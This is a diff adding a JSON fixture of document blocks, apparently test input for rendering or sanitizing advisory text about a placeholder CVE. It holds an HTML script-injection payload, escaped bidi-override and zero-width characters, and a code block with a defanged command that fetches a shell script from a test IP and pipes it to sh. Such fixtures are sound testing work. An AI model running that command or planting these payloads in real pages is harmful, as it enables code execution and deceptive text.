@@ -1,0 +1,38 @@
+[
+  {
+    "type": "paragraph",
+    "inlines": [
+      {
+        "type": "text",
+        "text": "We assess as attempts against CVE-2099-0001. <img src=x onerror=alert(1)>"
+      }
+    ]
+  },
+  {
+    "type": "paragraph",
+    "inlines": [
+      {
+        "type": "text",
+        "text": "click data proto "
+      },
+      {
+        "type": "link",
+        "text": "ok",
+        "href": "https://nvd.example.invalid/CVE-2099-0001"
+      }
+    ]
+  },
+  {
+    "type": "paragraph",
+    "inlines": [
+      {
+        "type": "text",
+        "text": "Bidi: a\\u{202e}b and zero\\u{200b}width."
+      }
+    ]
+  },
+  {
+    "type": "code",
+    "text": "curl hxxp://203.0.113.9/x.sh | sh"
+  }
+]
